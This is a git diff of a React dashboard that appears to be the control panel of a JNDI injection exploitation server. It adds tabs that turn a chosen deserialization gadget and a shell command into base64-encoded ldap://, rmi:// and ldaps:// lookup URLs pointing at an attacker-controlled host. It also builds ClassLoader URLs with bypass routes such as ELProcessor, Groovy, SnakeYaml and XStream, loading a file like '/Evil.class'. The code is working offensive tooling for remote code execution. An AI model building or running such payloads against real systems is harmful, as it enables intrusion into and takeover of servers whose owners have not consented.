@@ -15,11 +15,28 @@ export default function Dashboard() {
   const [loading, setLoading] = useState(false)
   const [msg, setMsg] = useState({ success: '', error: '' })
   const [toggling, setToggling] = useState(null)
+  const [activeJndiTab, setActiveJndiTab] = useState('config')
   const [gadgets, setGadgets] = useState([])
   const [gadgetSearch, setGadgetSearch] = useState('')
   const [selectedGadget, setSelectedGadget] = useState('')
   const [payloadCmd, setPayloadCmd] = useState('')
   const [payloadResult, setPayloadResult] = useState('')
+  const [payloadSubTab, setPayloadSubTab] = useState('gadget')
+  const [gadgetOpen, setGadgetOpen] = useState(false)
+  const [jndiPayloadResult, setJndiPayloadResult] = useState('')
+  const [rmiPayloadResult, setRmiPayloadResult] = useState('')
+  const [ldapsPayloadResult, setLdapsPayloadResult] = useState('')
+  const [jndiGadgetInput, setJndiGadgetInput] = useState('')
+  const [gadgetModeInput, setGadgetModeInput] = useState('')
+  const [saveFilename, setSaveFilename] = useState('')
+  const [filePath, setFilePath] = useState('')
+  const [classLoaderResult, setClassLoaderResult] = useState('')
+  const [rmiClassLoaderResult, setRmiClassLoaderResult] = useState('')
+  const [ldapsClassLoaderResult, setLdapsClassLoaderResult] = useState('')
+  const [routing, setRouting] = useState('ELProcessor')
+  const [routingOpen, setRoutingOpen] = useState(false)
+
+  const ROUTING_OPTIONS = ['Basic', 'ELProcessor', 'Groovy', 'jdbcBypass1', 'jdbcBypass2', 'ldap2rmi', 'SnakeYaml', 'XStream', 'MemoryXXE']
 
   const [configForm, setConfigForm] = useState({
     ip: '', ldapPort: 1389, ldapsPort: 1669, httpPort: 3456, rmiPort: 1099,
@@ -98,10 +115,12 @@ export default function Dashboard() {
   }
 
   async function handleGeneratePayload() {
+    const gadgetName = (gadgetModeInput || selectedGadget || '').trim()
+    if (!gadgetName) return
     setLoading(true)
     setMsg({ success: '', error: '' })
     try {
-      const res = await apiGenerate({ gadget: selectedGadget, command: payloadCmd })
+      const res = await apiGenerate({ gadget: gadgetName, command: payloadCmd, filename: saveFilename })
       if (res.data.success) {
         setPayloadResult(res.data.message || 'Payload generated successfully')
         setMsg({ success: 'Payload generated', error: '' })
@@ -111,6 +130,68 @@ export default function Dashboard() {
       }
     } catch (e) {
       setMsg({ success: '', error: 'Failed to generate payload' })
+    } finally { setLoading(false) }
+  }
+
+  function handleGenerateJndiPayload() {
+    const gadgetName = (jndiGadgetInput || selectedGadget || '').trim()
+    if (!gadgetName || !payloadCmd) return
+    setLoading(true)
+    setMsg({ success: '', error: '' })
+    setJndiPayloadResult('')
+    setRmiPayloadResult('')
+    setLdapsPayloadResult('')
+    try {
+      const bytes = new TextEncoder().encode(payloadCmd)
+      const cmdB64 = btoa(String.fromCharCode.apply(null, bytes))
+      const ipAddr = configForm.ip || '0.0.0.0'
+      const ldapPort = configForm.ldapPort || 1389
+      const rmiPort = configForm.rmiPort || 1099
+      const ldapsPort = configForm.ldapsPort || 1669
+
+      const ldapUrl = `ldap://${ipAddr}:${ldapPort}/Deserialization/${gadgetName}/command/Base64/${cmdB64}`
+      const rmiUrl = `rmi://${ipAddr}:${rmiPort}/Deserialization/${gadgetName}/command/Base64/${cmdB64}`
+      const ldapsUrl = `ldaps://${ipAddr}:${ldapsPort}/Deserialization/${gadgetName}/command/Base64/${cmdB64}`
+
+      setJndiPayloadResult(ldapUrl)
+      setRmiPayloadResult(rmiUrl)
+      setLdapsPayloadResult(ldapsUrl)
+      setMsg({ success: 'Payload URLs generated', error: '' })
+    } catch (e) {
+      setMsg({ success: '', error: 'Failed to generate URL' })
+    } finally { setLoading(false) }
+  }
+
+  function handleGenerateClassLoader() {
+    const fp = filePath.trim()
+    const route = routing.trim()
+    if (!fp || !route) return
+    setLoading(true)
+    setMsg({ success: '', error: '' })
+    setClassLoaderResult('')
+    setRmiClassLoaderResult('')
+    setLdapsClassLoaderResult('')
+    if (!fp.toLowerCase().endsWith('.class')) {
+      setMsg({ success: '', error: 'File path must end with .class' })
+      setLoading(false)
+      return
+    }
+    try {
+      const ipAddr = configForm.ip || '0.0.0.0'
+      const ldapPort = configForm.ldapPort || 1389
+      const rmiPort = configForm.rmiPort || 1099
+      const ldapsPort = configForm.ldapsPort || 1669
+
+      const ldapUrl = `ldap://${ipAddr}:${ldapPort}/${route}/M-LF-${fp}`
+      const rmiUrl = `rmi://${ipAddr}:${rmiPort}/${route}/M-LF-${fp}`
+      const ldapsUrl = `ldaps://${ipAddr}:${ldapsPort}/${route}/M-LF-${fp}`
+
+      setClassLoaderResult(ldapUrl)
+      setRmiClassLoaderResult(rmiUrl)
+      setLdapsClassLoaderResult(ldapsUrl)
+      setMsg({ success: 'ClassLoader URLs generated', error: '' })
+    } catch (e) {
+      setMsg({ success: '', error: 'Failed to generate URL' })
     } finally { setLoading(false) }
   }
 
@@ -152,14 +233,7 @@ export default function Dashboard() {
                 onClick={toggleTheme}
                 aria-label={theme === 'light' ? 'Switch to dark mode' : 'Switch to light mode'}
                 title={theme === 'light' ? 'Dark mode' : 'Light mode'}
-              >
-                <span className="pill-sun" style={{ position: 'absolute', top: 4, left: 5, opacity: theme === 'dark' ? 0.35 : 1, transition: 'opacity 0.2s' }}>
-                  &#x2600;&#xFE0F;
-                </span>
-                <span className="pill-moon" style={{ position: 'absolute', top: 4, right: 5, opacity: theme === 'dark' ? 1 : 0.35, transition: 'opacity 0.2s' }}>
-                  &#x1F319;
-                </span>
-              </button>
+              />
               <button className="logout-btn" onClick={logout}>Logout</button>
             </div>
           </div>
@@ -218,8 +292,26 @@ export default function Dashboard() {
               </div>
 
               <div className="glass-card section-enter">
-                <h2>Config</h2>
-                <div className="config-form">
+                <div className="control-bar">
+                  <div className={'tab-segment-control' + (activeJndiTab === 'payload' ? ' config-tab' : '')}>
+                    <button
+                      className={'tab-segment-btn' + (activeJndiTab === 'config' ? ' active' : '')}
+                      onClick={() => setActiveJndiTab('config')}
+                    >
+                      Config
+                    </button>
+                    <button
+                      className={'tab-segment-btn' + (activeJndiTab === 'payload' ? ' active' : '')}
+                      onClick={() => setActiveJndiTab('payload')}
+                    >
+                      Payload Generator
+                    </button>
+                  </div>
+                </div>
+
+                {activeJndiTab === 'config' && (
+                  <div key="jndi-config" className="tab-content-enter">
+                    <div className="config-form">
                       <div className="form-group">
                         <label>IP Address</label>
                         <input type="text" value={configForm.ip}
@@ -280,6 +372,128 @@ export default function Dashboard() {
                         {loading ? 'Saving...' : 'Save Configuration'}
                       </button>
                     </div>
+                  </div>
+                )}
+
+                {activeJndiTab === 'payload' && (
+                  <div key="jndi-payload" className="tab-content-enter">
+                    <div className="control-bar">
+                      <div className={'tab-segment-control' + (payloadSubTab === 'classloader' ? ' config-tab' : '')}>
+                        <button
+                          className={'tab-segment-btn' + (payloadSubTab === 'gadget' ? ' active' : '')}
+                          onClick={() => setPayloadSubTab('gadget')}
+                        >
+                          Gadget
+                        </button>
+                        <button
+                          className={'tab-segment-btn' + (payloadSubTab === 'classloader' ? ' active' : '')}
+                          onClick={() => setPayloadSubTab('classloader')}
+                        >
+                          ClassLoader
+                        </button>
+                      </div>
+                    </div>
+
+                    {payloadSubTab === 'gadget' && (
+                      <div key="payload-gadget" className="tab-content-enter">
+                        <div style={{ position: 'relative' }}>
+                          <div className="form-group">
+                            <label>Gadget</label>
+                            <input type="text"
+                              value={jndiGadgetInput}
+                              placeholder="Type or search..."
+                              onFocus={() => setGadgetOpen(true)}
+                              onBlur={() => setTimeout(() => setGadgetOpen(false), 150)}
+                              onChange={e => { setJndiGadgetInput(e.target.value); setGadgetSearch(e.target.value); }}
+                              style={{ cursor: 'text' }}
+                            />
+                          </div>
+                          {gadgetOpen && (
+                            <div className="gadget-dropdown" style={{ top: 'calc(100% - 8px)' }}>
+                              <div className="gadget-list" style={{ maxHeight: 180, border: 'none', borderRadius: 12 }}>
+                                {filteredGadgets.map(g => (
+                                  <div key={g.name}
+                                    className={'gadget-item' + (selectedGadget === g.name ? ' selected' : '')}
+                                    onMouseDown={e => { e.preventDefault(); setSelectedGadget(g.name); setJndiGadgetInput(g.name); setGadgetSearch(g.name); setGadgetOpen(false); }}>
+                                    {g.name}
+                                  </div>
+                                ))}
+                              </div>
+                            </div>
+                          )}
+                        </div>
+                        <div className="form-group">
+                          <label>Command</label>
+                          <textarea rows={4} value={payloadCmd} placeholder="e.g. whoami"
+                            onChange={e => setPayloadCmd(e.target.value)} />
+                        </div>
+                        <button className="btn btn-primary" onClick={handleGenerateJndiPayload}
+                          disabled={loading || (!(jndiGadgetInput || selectedGadget).trim()) || !payloadCmd}>
+                          {loading ? 'Generating...' : 'Generate'}
+                        </button>
+                        {jndiPayloadResult && (
+                          <div className="payload-output" style={{ marginTop: 14 }}>{jndiPayloadResult}</div>
+                        )}
+                        {rmiPayloadResult && (
+                          <div className="payload-output" style={{ marginTop: 8 }}>{rmiPayloadResult}</div>
+                        )}
+                        {ldapsPayloadResult && (
+                          <div className="payload-output" style={{ marginTop: 8 }}>{ldapsPayloadResult}</div>
+                        )}
+                      </div>
+                    )}
+
+                    {payloadSubTab === 'classloader' && (
+                      <div key="payload-classloader" className="tab-content-enter">
+                        <div style={{ position: 'relative' }}>
+                          <div className="form-group">
+                            <label>Routing</label>
+                            <input type="text"
+                              value={routing}
+                              placeholder="Select route..."
+                              onFocus={() => setRoutingOpen(true)}
+                              onBlur={() => setTimeout(() => setRoutingOpen(false), 150)}
+                              onChange={e => setRouting(e.target.value)}
+                              style={{ cursor: 'text' }}
+                            />
+                          </div>
+                          {routingOpen && (
+                            <div className="gadget-dropdown" style={{ top: 'calc(100% - 8px)' }}>
+                              <div className="gadget-list" style={{ maxHeight: 220, border: 'none', borderRadius: 12 }}>
+                                {ROUTING_OPTIONS.map(opt => (
+                                  <div key={opt}
+                                    className={'gadget-item' + (routing === opt ? ' selected' : '')}
+                                    onMouseDown={e => { e.preventDefault(); setRouting(opt); setRoutingOpen(false); }}>
+                                    {opt}
+                                  </div>
+                                ))}
+                              </div>
+                            </div>
+                          )}
+                        </div>
+                        <div className="form-group">
+                          <label>FilePath</label>
+                          <input type="text" value={filePath}
+                            placeholder="e.g. /Evil.class"
+                            onChange={e => setFilePath(e.target.value)} />
+                        </div>
+                        <button className="btn btn-primary" onClick={handleGenerateClassLoader}
+                          disabled={loading || !filePath.trim() || !routing.trim()}>
+                          {loading ? 'Generating...' : 'Generate'}
+                        </button>
+                        {classLoaderResult && (
+                          <div className="payload-output" style={{ marginTop: 14 }}>{classLoaderResult}</div>
+                        )}
+                        {rmiClassLoaderResult && (
+                          <div className="payload-output" style={{ marginTop: 8 }}>{rmiClassLoaderResult}</div>
+                        )}
+                        {ldapsClassLoaderResult && (
+                          <div className="payload-output" style={{ marginTop: 8 }}>{ldapsClassLoaderResult}</div>
+                        )}
+                      </div>
+                    )}
+                  </div>
+                )}
               </div>
             </>
           )}
@@ -287,40 +501,50 @@ export default function Dashboard() {
           {mode === 'gadget' && (
             <div className="glass-card section-enter">
               <h2>Payload Generator</h2>
-              <div className="grid-2">
-                <div>
-                  <h3 style={{ fontSize: 13, marginBottom: 10, color: 'var(--text-secondary)', fontWeight: 600, textTransform: 'uppercase', letterSpacing: 0.5 }}>
-                    Select Gadget
-                  </h3>
-                  <div className="form-group">
-                    <input type="text" placeholder="Search..." value={gadgetSearch}
-                      onChange={e => setGadgetSearch(e.target.value)} />
-                  </div>
-                  <div className="gadget-list">
-                    {filteredGadgets.map(g => (
-                      <div key={g.name}
-                        className={'gadget-item' + (selectedGadget === g.name ? ' selected' : '')}
-                        onClick={() => setSelectedGadget(g.name)}>
-                        {g.name}
-                      </div>
-                    ))}
-                  </div>
+              <div style={{ position: 'relative' }}>
+                <div className="form-group">
+                  <label>Gadget</label>
+                  <input type="text"
+                    value={gadgetModeInput}
+                    placeholder="Type or search..."
+                    onFocus={() => setGadgetOpen(true)}
+                    onBlur={() => setTimeout(() => setGadgetOpen(false), 150)}
+                    onChange={e => { setGadgetModeInput(e.target.value); setGadgetSearch(e.target.value); }}
+                    style={{ cursor: 'text' }}
+                  />
                 </div>
-                <div>
-                  <div className="form-group">
-                    <label>Command</label>
-                    <textarea rows={4} value={payloadCmd} placeholder="e.g. whoami"
-                      onChange={e => setPayloadCmd(e.target.value)} />
+                {gadgetOpen && (
+                  <div className="gadget-dropdown" style={{ top: 'calc(100% - 8px)' }}>
+                    <div className="gadget-list" style={{ maxHeight: 180, border: 'none', borderRadius: 12 }}>
+                      {filteredGadgets.map(g => (
+                        <div key={g.name}
+                          className={'gadget-item' + (selectedGadget === g.name ? ' selected' : '')}
+                          onMouseDown={e => { e.preventDefault(); setSelectedGadget(g.name); setGadgetModeInput(g.name); setGadgetSearch(g.name); setGadgetOpen(false); }}>
+                          {g.name}
+                        </div>
+                      ))}
+                    </div>
                   </div>
-                  <button className="btn btn-primary" onClick={handleGeneratePayload}
-                    disabled={loading || !selectedGadget}>
-                    {loading ? 'Generating...' : 'Generate Payload'}
-                  </button>
-                  {payloadResult && (
-                    <div className="payload-output">{payloadResult}</div>
-                  )}
-                </div>
+                )}
               </div>
+              <div className="form-group">
+                <label>Command</label>
+                <textarea rows={4} value={payloadCmd} placeholder="e.g. whoami"
+                  onChange={e => setPayloadCmd(e.target.value)} />
+              </div>
+              <div className="form-group">
+                <label>Save As (leave empty to discard)</label>
+                <input type="text" value={saveFilename}
+                  placeholder="e.g. payload.ser"
+                  onChange={e => setSaveFilename(e.target.value)} />
+              </div>
+              <button className="btn btn-primary" onClick={handleGeneratePayload}
+                disabled={loading || !(gadgetModeInput || selectedGadget).trim()}>
+                {loading ? 'Generating...' : 'Generate'}
+              </button>
+              {payloadResult && (
+                <div className="payload-output" style={{ marginTop: 14 }}>{payloadResult}</div>
+              )}
             </div>
           )}
         </div>
